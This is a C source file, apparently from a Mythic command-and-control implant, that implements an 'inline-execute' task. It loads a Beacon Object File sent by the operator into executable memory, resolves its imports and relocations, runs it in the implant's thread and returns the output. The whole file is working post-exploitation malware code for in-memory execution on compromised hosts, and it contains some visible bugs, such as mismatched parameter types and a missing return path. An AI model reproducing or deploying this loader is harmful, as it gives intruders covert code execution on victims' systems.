#include "Tasks/InlineExecute.h"

#include "Package.h"
#include "Parser.h"
#include "Task.h"
#include "Config.h"
#include "BeaconCompatibility.h"

#ifdef INCLUDE_CMD_INLINE_EXECUTE

/*
    Most code is from here https://github.com/Ap3x/COFF-Loader/tree/main/Src
*/

/*
    COFF Loader Supporting Functions
*/
BOOL InternalFunctionMatch(char* StrippedSymbolName) {
    if (STR_EQUALS(StrippedSymbolName, "Beacon")  ||
        STR_EQUALS(StrippedSymbolName, "GetProcAddress") ||
        STR_EQUALS(StrippedSymbolName, "GetModuleHandleA") ||
        STR_EQUALS(StrippedSymbolName, "toWideChar") ||
        STR_EQUALS(StrippedSymbolName, "LoadLibraryA") ||
        STR_EQUALS(StrippedSymbolName, "FreeLibrary"))
    {
        return TRUE;
    }
    return FALSE;
}

void* ProcessBeaconSymbols(char* SymbolName, BOOL InternalFunction) {
    void* functionaddress = NULL;
    char localSymbolNameCopy[1024] = { 0 };
    InternalFunction = FALSE;
    char* locallib = NULL;
    char* localfunc = SymbolName + sizeof(PREPENDSYMBOLVALUE) - 1;
    HMODULE llHandle = NULL;
    // strncpy_s(localSymbolNameCopy, SymbolName, sizeof(localSymbolNameCopy) - 1);
    strncpy_s(localSymbolNameCopy, sizeof(localSymbolNameCopy), SymbolName, sizeof(localSymbolNameCopy) - 1);
    char* context = NULL;

    if (InternalFunctionMatch(SymbolName + sizeof(PREPENDSYMBOLVALUE) - 1)) {
        InternalFunction = TRUE;

        localfunc = SymbolName + strlen(PREPENDSYMBOLVALUE);
        UINT32 hash = custom_hash(localfunc);
    
        // Compare function hashes
        for (int tempcounter = 0; tempcounter < 30; tempcounter++) {
            if (InternalFunctions[tempcounter][0] != NULL) {
                if (hash == (UINT32)(InternalFunctions[tempcounter][0])) {
                    functionaddress = (void*)InternalFunctions[tempcounter][1];
                    return functionaddress;
                }
            }
        }
    }
    else {
        //_dbg("\t\tExternal Symbol\n");
        locallib = strtok_s(localSymbolNameCopy + sizeof(PREPENDSYMBOLVALUE) - 1, "$", &context);
        llHandle = LoadLibraryA(locallib);

        //_dbg("\t\tHandle: 0x%lx\n", llHandle);
        localfunc = strtok_s(NULL, "$", &context);
        localfunc = strtok_s(localfunc, "@", &context);
        functionaddress = GetProcAddress(llHandle, localfunc);
        //_dbg("\t\tProcAddress: 0x%p\n", functionaddress);
        return functionaddress;
    }
}

BOOL ExecuteEntry(COFF_t* COFF, char* func, char* args, unsigned long argSize) {
    VOID(*foo)(char* in, UINT32 datalen) = NULL;

    if (!func || !COFF->FileBase)
        _dbg("No entry provided");

    for (UINT32 counter = 0; counter < COFF->FileHeader->NumberOfSymbols; counter++)
    {
        if (strcmp(COFF->SymbolTable[counter].first.Name, func) == 0) {
            foo = (void(*)(char*, UINT32))((char*)COFF->RawTextData + COFF->SymbolTable[counter].Value);
            _dbg("Trying to run: 0x%p\n\n", foo);
        }
    }

    if (!foo)
        _dbg("Couldn't find entry point");

    foo((char*)args, argSize);
    return TRUE;
}

void RelocationTypeParse(COFF_t* COFF, void** SectionMapped, int SectionNumber, BOOL InternalFunction, void* FunctionAddrPTR, char* FunctionMapping) {
    UINT32 offsetAddr = 0;
    UINT64 longOffsetAddr = 0;
    unsigned int Type = COFF->Relocation->Type;

    if (Type == IMAGE_REL_AMD64_ADDR64) 
    {
        memcpy(&longOffsetAddr, (char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, sizeof(UINT64));
        //_dbg("\tReadin longOffsetValue : 0x%llX\n", longOffsetAddr);
        longOffsetAddr = (UINT64)((char*)SectionMapped[COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].SectionNumber - 1] + (UINT64)longOffsetAddr);
        longOffsetAddr += COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].Value;
        //_dbg("\tModified longOffsetValue : 0x%llX Base Address: %p\n", longOffsetAddr, SectionMapped[COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].SectionNumber - 1]);
        memcpy((char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, &longOffsetAddr, sizeof(UINT64));
    }
    else if (COFF->Relocation->Type == IMAGE_REL_AMD64_ADDR32NB) {
        memcpy(&offsetAddr, (char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, sizeof(INT32));
        //_dbg("\tReadin OffsetValue : 0x%0X\n", offsetAddr);
        //_dbg("\t\tReferenced Section: 0x%X\n", (char*)SectionMapped[COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].SectionNumber - 1] + offsetAddr);
        //_dbg("\t\tEnd of Relocation Bytes: 0x%X\n", (char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress + 4);
        offsetAddr = ((char*)((char*)SectionMapped[COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].SectionNumber - 1] + offsetAddr) - ((char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress + 4));
        offsetAddr += COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].Value;
        //_dbg("\tSetting 0x%p to OffsetValue: 0x%X\n", (char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, offsetAddr);
        memcpy((char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, &offsetAddr, sizeof(UINT32));
    }
    else if (Type == IMAGE_REL_AMD64_REL32) {
        if (FunctionAddrPTR != NULL) {
            memcpy(FunctionMapping + (COFF->FunctionMappingCount * 8), &FunctionAddrPTR, sizeof(UINT64));
            offsetAddr = (INT32)((FunctionMapping + (COFF->FunctionMappingCount * 8) ) - ((char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress + 4));
            offsetAddr += COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].Value;
            //_dbg("\t\tSetting internal function at 0x%p to relative address: 0x%X\n", (char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, offsetAddr);
            memcpy((char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, &offsetAddr, sizeof(UINT32));
            InternalFunction = FALSE;
            COFF->FunctionMappingCount++;
        }
        else {
            // This should copy the relative offset for the specified data section into offsetAddr
            memcpy(&offsetAddr, (void*)((char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress), sizeof(UINT32));
            //_dbg("\tReadin Offset Value : 0x%llX\n", offsetAddr);
            // Getting the symbols section then adding the offset to get the value stored.
            offsetAddr += (UINT32)((char*)SectionMapped[COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].SectionNumber - 1] - ((char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress + 4));
            // Since the StorageClass is going to be IMAGE_SYM_CLASS_STATIC or IMAGE_SYM_CLASS_EXTERNAL with a non-zero SymbolTableIndex
            offsetAddr += COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].Value;
            //_dbg("\t\tSetting 0x%p to relative address: 0x%X\n", (char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, offsetAddr);
            memcpy((char*)SectionMapped[SectionNumber] + COFF->Relocation->VirtualAddress, &offsetAddr, sizeof(UINT32));
        }
    }
    else 
    {
        //_dbg("[!] Relocation Type Not Implemented\n");
    }
    //_dbg("\tValueNumber: 0x%X\n", COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].Value);
    //_dbg("\tSectionNumber: 0x%X\n", COFF->SymbolTable[COFF->Relocation->SymbolTableIndex].SectionNumber);
}

BOOL RunCOFF(char* FileData, DWORD* DataSize, char* EntryName, char* argumentdata, unsigned long argumentsize)
{

	COFF_t COFF;
    COFF.FileBase = FileData;
    COFF.FileHeader = (FileHeader_t*)COFF.FileBase;
    COFF.SymbolTable = (Symbol_t*)(COFF.FileBase + COFF.FileHeader->PointerToSymbolTable);
    COFF.FunctionMappingCount = 0;
    COFF.RelocationsCount = 0;
    
    char* functionMapping = NULL;
    void** sectionMapped = (void**)calloc(sizeof(char*) * (COFF.FileHeader->NumberOfSections + 1), 1);

    if ((int)COFF.FileHeader->Machine != IMAGE_FILE_MACHINE_AMD64) {
        _dbg("[!] This common object file format is not supported yet :)");
        free(sectionMapped);
        return FALSE;
    }

    for (byte i = 0; i < COFF.FileHeader->NumberOfSections; i++) {
        Section_t* section = (Section_t*)(COFF.FileBase + sizeof(FileHeader_t) + (i * sizeof(Section_t)));
        //_dbg("********* COFF Section %d: \"%s\" *********\n", i, section->Name);

        sectionMapped[i] = (char*)VirtualAlloc(NULL, section->SizeOfRawData, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
        //_dbg("Allocated section %d at 0x%p\n", i, sectionMapped[i]);

        if (section->PointerToRawData != 0) {
            memcpy(sectionMapped[i], COFF.FileBase + section->PointerToRawData, section->SizeOfRawData);
        }
        else {
            memset(sectionMapped[i], 0, section->SizeOfRawData);
        }

        if (!strcmp(section->Name, ".text")) {
            COFF.RawTextData = sectionMapped[i];
        }

        COFF.RelocationsCount += section->NumberOfRelocations;
    }

    //_dbg("Total Relocations: %d\n", COFF.RelocationsCount);

    functionMapping = (char*)VirtualAlloc(NULL, COFF.RelocationsCount * 8, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
    int currentSection = 0;
    for (int s = 0; s < COFF.FileHeader->NumberOfSections; s++) {
        Section_t* section = (Section_t*)(COFF.FileBase + sizeof(FileHeader_t) + (s * sizeof(Section_t)));
        COFF.RelocationsTextPTR = COFF.FileBase + section->PointerToRelocations;
        //_dbg("********* Performing Relocations for \"%s\" Section *********\n", section->Name);
        
        for (int i = 0; i < section->NumberOfRelocations; i++) {

            UINT32 symbolOffset = 0;
            void* funcptrlocation = NULL;
            COFF.Relocation = (Relocation_t*)(COFF.RelocationsTextPTR + (i * sizeof(Relocation_t)));
            
            symbolOffset = COFF.SymbolTable[COFF.Relocation->SymbolTableIndex].first.value[1];

            // Check if the symbol name is more that 8 bytes. If so then the name is stored at the .first.value address
            // We can assume that if the name is longer than 8 bytes then it is probably an internal function and starts with "__imp_" and needs to be processed.
            // So if the name is 8 bytes then it points to a specific section.
            if (COFF.SymbolTable[COFF.Relocation->SymbolTableIndex].first.Name[0] != 0) {
                RelocationTypeParse(&COFF, sectionMapped, s, FALSE, NULL, NULL);
            }
            else {
                BOOL internalFunctionCheck = FALSE;
                funcptrlocation = ProcessBeaconSymbols(((char*)(COFF.SymbolTable + COFF.FileHeader->NumberOfSymbols)) + symbolOffset, &internalFunctionCheck);
                if (funcptrlocation == NULL && COFF.SymbolTable[COFF.Relocation->SymbolTableIndex].SectionNumber == 0) {
                    _dbg("[!] Failed to resolve symbol\n");
                }

                RelocationTypeParse(&COFF, sectionMapped, s, &internalFunctionCheck, funcptrlocation, functionMapping);
            }
        }
    }

///////////////
/// EXECUTE ///
///////////////
    ExecuteEntry(&COFF, EntryName, argumentdata, argumentsize);
///////////////
/// EXECUTE ///
///////////////


// CLEANUP
    for (byte i = 0; i < COFF.FileHeader->NumberOfSections; i++) {
        if (sectionMapped[i] != NULL) {
            // Free memory allocated with VirtualAlloc
            VirtualFree(sectionMapped[i], 0, MEM_RELEASE);
            sectionMapped[i] = NULL;  // Prevent dangling pointers
        }
    }
    // Free the array
    free(sectionMapped);
    sectionMapped = NULL;

    VirtualFree(functionMapping, 0, MEM_RELEASE);

    return TRUE;
}


/**
 * @brief Execute a Beacon Object File in current process thread.
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] arguments PARSER struct containing task data.
 * @return VOID
 */
VOID InlineExecute(PCHAR taskUuid, PPARSER arguments)
{
    /* Parse command arguments */
    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("GOT %d arguments", nbArg);

    if ( nbArg < 2 )
    {
        _err("Invalid number of arguments");
        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
        return;
    }

    PCHAR  BofData   = NULL;
    PCHAR  BofArgs   = NULL;
    SIZE_T bofLen    = 0;
    SIZE_T argLen    = 0;

    /* Get BOF and Arguments */
    BofArgs = ParserGetString(arguments, &argLen);
    BofData = ParserGetString(arguments, &bofLen);

    if ( BofData == NULL || bofLen == 0 )
    {
        _err("Invalid BOF data");
        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
        return;
    }

    /* Execute the BOF with pre-packed arguments */
    if ( !RunCOFF(BofData, &bofLen, "go", BofArgs, argLen) ) 
    {
        _err("Failed to execute BOF in current thread.");
        PackageError(taskUuid, ERROR_MYTHIC_BOF);
        return;
    }

    /* Read output from Global Beacon Output Buffer */
    PCHAR OutData = NULL;
	INT   OutSize = 0;
    
    OutData       = BeaconGetOutputData(&OutSize);

	if ( OutData == NULL || OutSize == 0 ) 
    {
        _err("Failed get BOF output");
        PackageError(taskUuid, ERROR_MYTHIC_BOF);
        return;
	}

    PPackage locals = PackageInit(0, FALSE);
    PackageAddString(locals, OutData, FALSE);
    
    // Success
    PackageComplete(taskUuid, locals);

// Cleanup
    free(OutData);                  // allocated in BeaconOutput()
    PackageDestroy(locals);
}

#endif  //INCLUDE_CMD_INLINE_EXECUTE